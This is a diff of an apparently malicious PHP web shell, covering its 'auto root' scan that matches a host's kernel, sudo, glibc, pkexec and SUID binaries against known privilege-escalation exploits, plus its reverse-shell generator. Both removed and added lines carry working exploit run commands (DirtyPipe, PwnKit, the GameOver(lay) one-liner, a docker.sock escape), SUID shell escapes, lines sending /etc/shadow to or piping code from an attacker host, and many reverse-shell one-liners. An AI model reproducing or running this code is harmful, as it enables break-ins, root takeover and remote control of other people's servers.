@@ -815,130 +815,6 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
         exit;
     }
 
-    // === DYNAMIC CVE DATABASE ===
-    function getCVEDatabase() {
-        $cveDb = [
-            // Kernel CVEs - Linux Privilege Escalation
-            ['cve'=>'CVE-2024-1086','type'=>'kernel','name'=>'Netfilter nf_tables','desc'=>'Netfilter use-after-free vulnerability','severity'=>'CRITICAL','kernel_min'=>'5.0','kernel_max'=>'6.7','url'=>'https://github.com/DataDog/CVE-2024-1086/blob/main/exploit.c','compile'=>'gcc -o exploit exploit.c','run'=>'./exploit'],
-            ['cve'=>'CVE-2024-0565','type'=>'kernel','name'=>'Bluetooth Memory Corruption','desc'=>'Bluetooth subsystem memory corruption','severity'=>'HIGH','kernel_min'=>'5.10','kernel_max'=>'6.7','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2023-52573','type'=>'kernel','name'=>'io_uring Local DoS','desc'=>'io_uring integer overflow leading to privesc','severity'=>'HIGH','kernel_min'=>'5.1','kernel_max'=>'6.6','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2023-35001','type'=>'kernel','name'=>'BPF Verifier','desc'=>'eBPF verifier logic flaw','severity'=>'HIGH','kernel_min'=>'5.8','kernel_max'=>'6.3','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2023-32629','type'=>'kernel','name'=>'OverlayFS Vulnerability','desc'=>'OverlayFS permission bypass','severity'=>'CRITICAL','kernel_min'=>'5.10','kernel_max'=>'6.3','distro'=>'ubuntu','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2023-2640','type'=>'kernel','name'=>'GameOver(lay)','desc'=>'Ubuntu OverlayFS privilege escalation one-liner','severity'=>'CRITICAL','kernel_min'=>'5.15','kernel_max'=>'6.2','distro'=>'ubuntu','url'=>'https://github.com/g0t0sec/CVE-2023-2640-CVE-2023-32629','compile'=>'','run'=>'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]asswd l/;setfattr -n trusted.overlay.metacopy -v y l/passwd;mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && touch m/passwd && u/passwd"'],
-            ['cve'=>'CVE-2023-0386','type'=>'kernel','name'=>'OverlayFS setuid','desc'=>'OverlayFS setuid file copy-up vulnerability','severity'=>'HIGH','kernel_min'=>'5.11','kernel_max'=>'6.2','url'=>'https://github.com/xkaneiki/CVE-2023-0386','compile'=>'make','run'=>'./exploit'],
-            ['cve'=>'CVE-2023-4911','type'=>'glibc','name'=>'Looney Tunables','desc'=>'glibc ld.so buffer overflow via GLIBC_TUNABLES','severity'=>'HIGH','glibc_min'=>'2.34','glibc_max'=>'2.38','url'=>'https://github.com/amoeba/CVE-2023-4911','compile'=>'gcc -o exploit exploit.c','run'=>'./exploit'],
-            ['cve'=>'CVE-2023-2124','type'=>'kernel','name'=>'VirtIO DMA','desc'=>'VirtIO device DMA access before DRIVER_OK','severity'=>'HIGH','kernel_min'=>'5.0','kernel_max'=>'6.2','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2022-42703','type'=>'kernel','name'=>'io_uring KASAN','desc'=>'io_uring registered buffers KASAN double free','severity'=>'HIGH','kernel_min'=>'5.1','kernel_max'=>'6.0','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2022-25636','type'=>'kernel','name'=>'Netfilter nf_tables','desc'=>'nf_tables out-of-bounds write','severity'=>'HIGH','kernel_min'=>'5.4','kernel_max'=>'5.16','url'=>'https://github.com/Pwnium/CVE-2022-25636','compile'=>'gcc -o exploit exploit.c -lmnl -lnftnl','run'=>'./exploit'],
-            ['cve'=>'CVE-2022-0847','type'=>'kernel','name'=>'DirtyPipe','desc'=>'Overwrite read-only files via pipe splice','severity'=>'CRITICAL','kernel_min'=>'5.8','kernel_max'=>'5.16.10','url'=>'https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c','compile'=>'gcc -o exploit exploit.c','run'=>'./exploit /usr/bin/su'],
-            ['cve'=>'CVE-2022-1598','type'=>'kernel','name'=>'Kernel KSM Vulnerability','desc'=>'Kernel same-page merging privilege escalation','severity'=>'HIGH','kernel_min'=>'4.4','kernel_max'=>'5.16','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2021-3493','type'=>'kernel','name'=>'OverlayFS Mount','desc'=>'OverlayFS mount namespace escape','severity'=>'HIGH','kernel_min'=>'4.9','kernel_max'=>'5.11','url'=>'https://github.com/briskets/CVE-2021-3493','compile'=>'gcc -o exploit exploit.c','run'=>'./exploit'],
-            ['cve'=>'CVE-2021-3156','type'=>'sudo','name'=>'Baron Samedit','desc'=>'Sudo heap-based overflow in sudoedit -s','severity'=>'CRITICAL','sudo_max'=>'1.9.5p1','url'=>'https://github.com/blasty/CVE-2021-3156/blob/main/hax.c','compile'=>'gcc -o hax hax.c','run'=>'./hax'],
-            ['cve'=>'CVE-2021-4034','type'=>'polkit','name'=>'PwnKit','desc'=>'Polkit pkexec local privilege escalation','severity'=>'CRITICAL','url'=>'https://github.com/ly4k/PwnKit/blob/main/PwnKit.c','compile'=>'gcc -o PwnKit PwnKit.c','run'=>'./PwnKit'],
-            ['cve'=>'CVE-2021-22555','type'=>'kernel','name'=>'Netfilter Heap','desc'=>'Netfilter heap buffer overflow','severity'=>'CRITICAL','kernel_min'=>'4.9','kernel_max'=>'5.13','url'=>'https://github.com/smallkirby/kernelpwn/blob/master/CVE-2021-22555/exploit.c','compile'=>'gcc -o exploit exploit.c','run'=>'./exploit'],
-            ['cve'=>'CVE-2021-0920','type'=>'kernel','name'=>'Unix Socket Race','desc'=>'Unix socket garbage collection race condition','severity'=>'HIGH','kernel_min'=>'5.0','kernel_max'=>'5.10','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2020-14386','type'=>'kernel','name'=>'Network Packet Socket','desc'=>'Raw packet socket integer overflow','severity'=>'HIGH','kernel_min'=>'2.6.32','kernel_max'=>'5.8','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2019-14287','type'=>'sudo','name'=>'Sudo User ID Bypass','desc'=>'Sudo -u#-1 bypass (ALL) exploit','severity'=>'MEDIUM','sudo_max'=>'1.8.27','url'=>'','compile'=>'','run'=>'sudo -u#-1 /bin/bash'],
-            ['cve'=>'CVE-2019-13272','type'=>'kernel','name'=>'ptrace Scope','desc'=>'ptrace scope bypass via PTRACE_PEEKUSR','severity'=>'HIGH','kernel_min'=>'2.6.26','kernel_max'=>'5.1','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2019-1010022','type'=>'kernel','name'=>'inode_init_owner','desc'=>'POSIX ACL privilege escalation','severity'=>'HIGH','kernel_min'=>'4.3','kernel_max'=>'5.1','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2018-1000112','type'=>'kernel','name'=>'vfat Overflow','desc'=>'Fat filesystem buffer overflow','severity'=>'HIGH','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2018-5333','type'=>'kernel','name'=>'Memory Mapping','desc'=>'Memory mapping alignment flaw','severity'=>'MEDIUM','kernel_min'=>'2.6.32','kernel_max'=>'4.15','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2016-5195','type'=>'kernel','name'=>'DirtyCow','desc'=>'Copy-on-write race condition','severity'=>'CRITICAL','kernel_min'=>'2.6.22','kernel_max'=>'4.8.2','url'=>'https://github.com/firefart/dirtycow/blob/master/dirty.c','compile'=>'gcc -pthread -o dirty dirty.c -lcrypt','run'=>'./dirty'],
-            ['cve'=>'CVE-2016-0728','type'=>'kernel','name'=>'Keyring Use-After-Free','desc'=>'Kernel keyring use-after-free','severity'=>'CRITICAL','kernel_min'=>'2.6.18','kernel_max'=>'4.4.1','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2016-2384','type'=>'kernel','name'=>'ALSA USB','desc'=>'ALSA USB audio driver use-after-free','severity'=>'HIGH','kernel_min'=>'3.14','kernel_max'=>'4.4','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2015-3290','type'=>'kernel','name'=>'General Protection Exception','desc'=>'X87 FPU exception handling vulnerability','severity'=>'HIGH','kernel_min'=>'2.6.32','kernel_max'=>'4.1.1','url'=>'','compile'=>'','run'=>''],
-            ['cve'=>'CVE-2014-9322','type'=>'kernel','name'=>'ASLR Bypass','desc'=>'x86/x64 userspace ASLR bypass','severity'=>'HIGH','kernel_min'=>'3.14','kernel_max'=>'3.17','url'=>'','compile'=>'','run'=>''],
-            // SUID Binary Exploits
-            ['cve'=>'N/A','type'=>'suid','name'=>'nmap SUID','desc'=>'nmap interactive mode shell escape','severity'=>'HIGH','binary'=>'nmap','run'=>'nmap --interactive','payload'=>'!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'vim SUID','desc'=>'vim command mode shell escape','severity'=>'HIGH','binary'=>'vim','run'=>'vim','payload'=>':!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'find SUID','desc'=>'find -exec shell escape','severity'=>'HIGH','binary'=>'find','run'=>'find / -exec /bin/bash \\;','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'less SUID','desc'=>'less command mode shell escape','severity'=>'HIGH','binary'=>'less','run'=>'less /etc/passwd','payload'=>'!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'more SUID','desc'=>'more command mode shell escape','severity'=>'HIGH','binary'=>'more','run'=>'more /etc/passwd','payload'=>'!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'man SUID','desc'=>'man pager shell escape','severity'=>'HIGH','binary'=>'man','run'=>'man man','payload'=>'!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'awk SUID','desc'=>'awk system() call abuse','severity'=>'HIGH','binary'=>'awk','run'=>'awk \'BEGIN {system("/bin/sh")}\'','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'perl SUID','desc'=>'perl -e execution','severity'=>'HIGH','binary'=>'perl','run'=>'perl -e \'exec("/bin/sh");\'','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'python SUID','desc'=>'python -c execution','severity'=>'HIGH','binary'=>'python','run'=>'python -c \'import os; os.system("/bin/sh")\'','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'php SUID','desc'=>'php shell mode','severity'=>'HIGH','binary'=>'php','run'=>'php -r \'system("/bin/sh");\'','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'bash SUID','desc'=>'bash -p no-drop-privileges','severity'=>'HIGH','binary'=>'bash','run'=>'bash -p','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'zsh SUID','desc'=>'zsh shell mode','severity'=>'HIGH','binary'=>'zsh','run'=>'zsh','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'dash SUID','desc'=>'dash shell mode','severity'=>'HIGH','binary'=>'dash','run'=>'dash -p','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'socat SUID','desc'=>'socat execute shell','severity'=>'HIGH','binary'=>'socat','run'=>'socat - EXEC:/bin/sh','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'wget SUID','desc'=>'wget post-install script execution','severity'=>'HIGH','binary'=>'wget','run'=>'wget --post-file=/etc/shadow http://attacker','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'curl SUID','desc'=>'curl output to shell','severity'=>'HIGH','binary'=>'curl','run'=>'curl http://attacker | sh','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'ftp SUID','desc'=>'ftp shell mode','severity'=>'HIGH','binary'=>'ftp','run'=>'ftp','payload'=>'!sh'],
-            ['cve'=>'N/A','type'=>'suid','name'=>'nc SUID','desc'=>'netcat shell binding','severity'=>'CRITICAL','binary'=>'nc','run'=>'nc -l -e /bin/sh','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'node SUID','desc'=>'node.js exec function','severity'=>'HIGH','binary'=>'node','run'=>'node -e "require(\'child_process\').exec(\'/bin/sh\')"','payload'=>''],
-            ['cve'=>'N/A','type'=>'suid','name'=>'ruby SUID','desc'=>'ruby system call','severity'=>'HIGH','binary'=>'ruby','run'=>'ruby -e \'system("/bin/sh")\'','payload'=>''],
-            // Container Escape CVEs
-            ['cve'=>'N/A','type'=>'container','name'=>'Docker Socket','desc'=>'Docker socket escape to host','severity'=>'CRITICAL','container'=>'docker','run'=>'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh','payload'=>''],
-            ['cve'=>'N/A','type'=>'container','name'=>'Kubernetes Node','desc'=>'Kubernetes privileged pod escape','severity'=>'CRITICAL','container'=>'kubernetes','run'=>'kubectl run --privileged -it pwn -- /bin/sh','payload'=>''],
-            ['cve'=>'CVE-2019-5736','type'=>'container','name'=>'runc Container Escape','desc'=>'runc open-time race condition','severity'=>'CRITICAL','container'=>'runc','url'=>'https://github.com/opencontainers/runc/commit/0ecd46d','compile'=>'','run'=>''],
-        ];
-        return $cveDb;
-    }
-
-    function matchCVEsWithSystem($kernelVer, $kernelMajor, $kernelMinor, $kernelPatch, $sudoVer, $glibcVer, $pkexecVer, $suidBins, $isUbuntu, $isDebian, $isRedhat) {
-        $cveDb = getCVEDatabase();
-        $matched = [];
-        
-        foreach ($cveDb as $cve) {
-            $match = false;
-            
-            // Kernel CVE matching
-            if ($cve['type'] === 'kernel' && !empty($cve['kernel_min'])) {
-                list($kMin,$kMinorMin,$kPatchMin) = array_pad(explode('.',str_pad($cve['kernel_min'],3,'0','0')),-3,0);
-                list($kMax,$kMinorMax,$kPatchMax) = array_pad(explode('.',str_pad($cve['kernel_max'],3,'0','0')),-3,0);
-                $kernMinor = (int)($kernelMajor*1000 + $kernelMinor);
-                $cveMinor = (int)(((int)$kMin)*1000 + ((int)$kMinorMin));
-                $cveMaxor = (int)(((int)$kMax)*1000 + ((int)$kMinorMax));
-                if ($kernMinor >= $cveMinor && $kernMinor <= $cveMaxor) {
-                    // Distro check
-                    if (isset($cve['distro'])) {
-                        if ($cve['distro'] === 'ubuntu' && $isUbuntu) $match = true;
-                        else if ($cve['distro'] === 'debian' && $isDebian) $match = true;
-                        else if ($cve['distro'] === 'redhat' && $isRedhat) $match = true;
-                    } else {
-                        $match = true;
-                    }
-                }
-            }
-            
-            // Sudo CVE matching
-            if ($cve['type'] === 'sudo' && !empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv)) {
-                if (!empty($cve['sudo_max']) && version_compare($sv[1], $cve['sudo_max'], '<=')) {
-                    $match = true;
-                }
-            }
-            
-            // glibc CVE matching
-            if ($cve['type'] === 'glibc' && !empty($glibcVer) && preg_match('/(\d+\.\d+)/', $glibcVer, $gm)) {
-                if (!empty($cve['glibc_min']) && !empty($cve['glibc_max'])) {
-                    if (version_compare($gm[1], $cve['glibc_min'], '>=') && version_compare($gm[1], $cve['glibc_max'], '<=')) {
-                        $match = true;
-                    }
-                }
-            }
-            
-            // Polkit CVE matching
-            if ($cve['type'] === 'polkit' && (!empty($pkexecVer) || strpos($suidBins, 'pkexec') !== false)) {
-                $match = true;
-            }
-            
-            // SUID Binary matching
-            if ($cve['type'] === 'suid' && isset($cve['binary'])) {
-                if (strpos($suidBins, $cve['binary']) !== false) {
-                    $match = true;
-                }
-            }
-            
-            if ($match) {
-                $matched[] = $cve;
-            }
-        }
-        
-        return $matched;
-    }
-
     // === AUTO ROOT - SCAN ===
     if ($fAct === 'auto_root_scan') {
         $kernel = trim(safeExec('uname -r 2>/dev/null') ?: '');
@@ -951,65 +827,73 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
         $writable = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : (is_writable('/var/tmp') ? '/var/tmp' : ''));
         $sudoVer = trim(safeExec('sudo --version 2>/dev/null | head -1') ?: '');
         $pkexecVer = trim(safeExec('pkexec --version 2>/dev/null') ?: '');
-        $suidBins = trim(safeExec('find / -perm -4000 -type f 2>/dev/null | head -50') ?: '');
+        $suidBins = trim(safeExec('find / -perm -4000 -type f 2>/dev/null | head -30') ?: '');
         $dockerSock = file_exists('/var/run/docker.sock') ? 'yes' : 'no';
         $inDocker = file_exists('/.dockerenv') ? 'yes' : 'no';
-        
-        // Parse kernel version
         $kMajor = 0; $kMinor = 0; $kPatch = 0;
         if (preg_match('/^(\d+)\.(\d+)\.(\d+)/', $kernel, $km)) {
             $kMajor = (int)$km[1]; $kMinor = (int)$km[2]; $kPatch = (int)$km[3];
         }
-        
-        // Detect distro
-        $isUbuntu = (stripos($kernelAll, 'ubuntu') !== false || stripos($os, 'ubuntu') !== false);
-        $isDebian = (stripos($os, 'debian') !== false);
-        $isRedhat = (stripos($os, 'redhat') !== false || stripos($os, 'centos') !== false || stripos($os, 'fedora') !== false);
-        
-        // Get glibc version
-        $glibcVer = trim(safeExec('ldd --version 2>&1 | head -1') ?: '');
-        
-        // Match CVEs dynamically
-        $exploits = matchCVEsWithSystem($kernel, $kMajor, $kMinor, $kPatch, $sudoVer, $glibcVer, $pkexecVer, $suidBins, $isUbuntu, $isDebian, $isRedhat);
-        
-        // Docker socket escape
-        if ($dockerSock === 'yes') {
-            $exploits[] = ['cve'=>'N/A','name'=>'Docker Socket','desc'=>'Escape via /var/run/docker.sock','severity'=>'CRITICAL','type'=>'container','run'=>'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh'];
+        $exploits = [];
+        // DirtyPipe CVE-2022-0847
+        if ($kMajor == 5 && (($kMinor >= 8 && $kMinor < 16) || ($kMinor == 16 && $kPatch < 11) || ($kMinor == 15 && $kPatch < 25) || ($kMinor == 10 && $kPatch < 102))) {
+            $exploits[] = ['cve'=>'CVE-2022-0847','name'=>'DirtyPipe','desc'=>'Overwrite read-only files via pipe splice','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c','compile'=>'gcc exploit.c -o exploit','run'=>'./exploit /usr/bin/su'];
         }
-        
-        // Extract SUID exploitable binaries
+        // DirtyCow CVE-2016-5195
+        if (($kMajor == 2 && $kMinor >= 6) || ($kMajor == 3) || ($kMajor == 4 && ($kMinor < 8 || ($kMinor == 8 && $kPatch < 3)))) {
+            $exploits[] = ['cve'=>'CVE-2016-5195','name'=>'DirtyCow','desc'=>'Race condition in COW mechanism','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c','compile'=>'gcc -pthread dirty.c -o dirty -lcrypt','run'=>'./dirty'];
+        }
+        // PwnKit CVE-2021-4034
+        if (!empty($pkexecVer) || strpos($suidBins, 'pkexec') !== false) {
+            $exploits[] = ['cve'=>'CVE-2021-4034','name'=>'PwnKit','desc'=>'Polkit pkexec local privesc','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c','compile'=>'gcc PwnKit.c -o PwnKit','run'=>'./PwnKit'];
+        }
+        // Baron Samedit CVE-2021-3156
+        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv)) {
+            if (version_compare($sv[1], '1.9.5', '<')) {
+                $exploits[] = ['cve'=>'CVE-2021-3156','name'=>'Baron Samedit','desc'=>'Sudo heap overflow via sudoedit -s','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c','compile'=>'gcc hax.c -o hax','run'=>'./hax'];
+            }
+        }
+        // Looney Tunables CVE-2023-4911
+        $glibcVer = trim(safeExec('ldd --version 2>&1 | head -1') ?: '');
+        if (preg_match('/(\d+\.\d+)/', $glibcVer, $gm)) {
+            if (version_compare($gm[1], '2.34', '>=') && version_compare($gm[1], '2.39', '<')) {
+                $exploits[] = ['cve'=>'CVE-2023-4911','name'=>'Looney Tunables','desc'=>'Glibc ld.so GLIBC_TUNABLES overflow','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'GLIBC_TUNABLES exploit'];
+            }
+        }
+        // OverlayFS CVE-2023-0386
+        if (($kMajor == 5 && $kMinor >= 11) || ($kMajor == 6 && $kMinor < 2)) {
+            $exploits[] = ['cve'=>'CVE-2023-0386','name'=>'OverlayFS','desc'=>'OverlayFS setuid copy up','severity'=>'HIGH','url'=>'','compile'=>'make','run'=>'./exploit'];
+        }
+        // GameOver(lay) CVE-2023-2640 + CVE-2023-32629 (Ubuntu)
+        if (stripos($kernelAll, 'ubuntu') !== false || stripos($os, 'ubuntu') !== false) {
+            if (($kMajor == 5 && $kMinor >= 15) || $kMajor == 6) {
+                $exploits[] = ['cve'=>'CVE-2023-2640','name'=>'GameOver(lay)','desc'=>'Ubuntu OverlayFS one-liner','severity'=>'CRITICAL','url'=>'','compile'=>'','run'=>"unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/;setfattr -n trusted.overlay.metacopy -v y l/passwd;mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && touch m/passwd && u/passwd\""];
+            }
+        }
+        // Sudo bypass CVE-2019-14287
+        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv2)) {
+            if (version_compare($sv2[1], '1.8.28', '<')) {
+                $exploits[] = ['cve'=>'CVE-2019-14287','name'=>'Sudo Bypass','desc'=>'Sudo -u#-1 bypass','severity'=>'MEDIUM','url'=>'','compile'=>'','run'=>'sudo -u#-1 /bin/bash'];
+            }
+        }
+        // Netfilter CVE-2022-25636
+        if ($kMajor == 5 && $kMinor >= 4 && $kMinor <= 6) {
+            $exploits[] = ['cve'=>'CVE-2022-25636','name'=>'Netfilter OOB','desc'=>'nf_tables OOB write','severity'=>'HIGH','url'=>'','compile'=>'gcc exploit.c -o exploit -lmnl -lnftnl','run'=>'./exploit'];
+        }
+        // Docker socket
+        if ($dockerSock === 'yes') {
+            $exploits[] = ['cve'=>'N/A','name'=>'Docker Socket','desc'=>'Escape via docker.sock','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'docker run -v /:/mnt --rm -it alpine chroot /mnt sh'];
+        }
+        // SUID check
         $suidExploits = [];
-        $dangerSuid = ['nmap','vim','find','bash','python','python3','perl','ruby','php','env','awk','less','more','ftp','socat','wget','curl','nc','ncat','node','lua','zsh','dash'];
+        $dangerSuid = ['nmap','vim','find','bash','python','python3','perl','ruby','php','env','awk','less','more','ftp','socat','wget','curl','nc','ncat','node','lua'];
         foreach (explode("\n", $suidBins) as $sb) {
             $bn = basename(trim($sb));
             if (in_array($bn, $dangerSuid)) $suidExploits[] = ['bin'=>trim($sb),'name'=>$bn];
         }
-        
-        echo json_encode([
-            'ok'=>true,
-            'info'=>[
-                'kernel'=>$kernel,
-                'kernel_full'=>$kernelAll,
-                'os'=>$os,
-                'arch'=>$arch,
-                'user'=>$whoami,
-                'uid'=>$uid,
-                'gcc'=>$gcc?:'not found',
-                'writable_dir'=>$writable?:'none',
-                'sudo'=>$sudoVer,
-                'pkexec'=>$pkexecVer,
-                'glibc'=>$glibcVer,
-                'docker_sock'=>$dockerSock,
-                'in_docker'=>$inDocker,
-                'distro'=>$isUbuntu?'Ubuntu':($isDebian?'Debian':($isRedhat?'RedHat':'Unknown'))
-            ],
-            'exploits'=>$exploits,
-            'exploits_count'=>count($exploits),
-            'suid_exploits'=>$suidExploits
-        ]);
+        echo json_encode(['ok'=>true,'info'=>['kernel'=>$kernel,'kernel_full'=>$kernelAll,'os'=>$os,'arch'=>$arch,'user'=>$whoami,'uid'=>$uid,'gcc'=>$gcc?:'not found','writable_dir'=>$writable?:'none','sudo'=>$sudoVer,'pkexec'=>$pkexecVer,'glibc'=>$glibcVer,'docker_sock'=>$dockerSock,'in_docker'=>$inDocker],'exploits'=>$exploits,'suid_exploits'=>$suidExploits,'suid_bins'=>$suidBins]);
         exit;
     }
-
 
     // === AUTO ROOT - EXECUTE ===
     if ($fAct === 'auto_root_exec') {
@@ -1088,238 +972,23 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
 
         $cmd = '';
         switch ($bt) {
-            case 'bash_i':
-                $cmd = "bash -i >& /dev/tcp/$bh/$bp 0>&1 &";
-                break;
-            case 'bash_196':
-                $cmd = "0<&196;exec 196<>/dev/tcp/$bh/$bp; bash <&196 >&196 2>&196 &";
-                break;
-            case 'bash_readline':
-                $cmd = "exec 5<>/dev/tcp/$bh/$bp;cat <&5 | while read line; do \$line 2>&5 >&5; done &";
-                break;
-            case 'bash_5':
-                $cmd = "bash -i 5<> /dev/tcp/$bh/$bp 0<&5 1>&5 2>&5 &";
-                break;
-            case 'bash_udp':
-                $cmd = "bash -i >& /dev/udp/$bh/$bp 0>&1 &";
-                break;
-            case 'nc_mkfifo':
-                $cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $bh $bp >/tmp/f &";
-                break;
-            case 'nc_e':
-                $cmd = "nc $bh $bp -e bash &";
-                break;
-            case 'ncat_e':
-                $cmd = "ncat $bh $bp -e bash &";
-                break;
-            case 'curl_telnet':
-                $cmd = "C='curl -Ns telnet://$bh:$bp'; \$C </dev/null 2>&1 | bash 2>&1 | \$C >/dev/null &";
-                break;
             case 'perl':
-                $cmd = 'perl -e \'use Socket;\$i="'.$bh.'";\$p='.$bp.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &';
-                break;
-            case 'perl_no_sh':
-                $cmd = 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'.$bh.':'.$bp.'");STDIN->fdopen($c,r);\$~->fdopen($c,w);system\$_ while<>;\' &';
+                $cmd = 'perl -e \'use Socket;$i="'.$bh.'";$p='.$bp.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &';
                 break;
             case 'python':
                 $cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$bh.'",'.$bp.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &';
-                break;
-            case 'openssl':
-                $cmd = "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $bh:$bp > /tmp/s; rm /tmp/s &";
-                break;
-            case 'php_exec':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);exec(\"/bin/sh <&3 >&3 2>&3\");' &";
-                break;
-            case 'php_shell_exec':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);shell_exec(\"/bin/sh <&3 >&3 2>&3\");' &";
-                break;
-            case 'php_system':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);system(\"/bin/sh <&3 >&3 2>&3\");' &";
-                break;
-            case 'php_passthru':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);passthru(\"/bin/sh <&3 >&3 2>&3\");' &";
-                break;
-            case 'php_popen':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");' &";
-                break;
-            case 'php_proc_open':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);\$proc=proc_open(\"/bin/sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);' &";
-                break;
-            case 'node':
-                $cmd = 'node -e \'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var client=new net.Socket();client.connect('.$bp.',"'.$bh.'",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\' &';
-                break;
-            case 'ruby':
-                $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
-                break;
-            // ADDITIONAL NETCAT VARIANTS
-            case 'nc_c':
-                $cmd = "nc -c bash $bh $bp &";
-                break;
-            case 'busybox_nc':
-                $cmd = "busybox nc $bh $bp -e bash &";
-                break;
-            case 'ncat_udp':
-                $cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u $bh $bp >/tmp/f &";
-                break;
-            // ADDITIONAL PERL VARIANTS
-            case 'perl_pentestmonkey':
-                $cmd = "perl -e 'use Socket;\$i=\"$bh\";\$p=$bp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}' &";
-                break;
-            // ADDITIONAL PHP VARIANTS
-            case 'php_backtick':
-                $cmd = "php -r '\$sock=fsockopen(\"$bh\",$bp);\`bash <&3 >&3 2>&3\`;' &";
-                break;
-            case 'php_cmd':
-                $cmd = "php -r 'if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }' &";
-                break;
-            case 'php_cmd_small':
-                $cmd = "php -r 'echo \`\$_GET[0]\`;' &";
-                break;
-            // RUSTCAT
-            case 'rustcat':
-                $cmd = "rcat connect -s bash $bh $bp &";
-                break;
-            // HASKELL
-            case 'haskell':
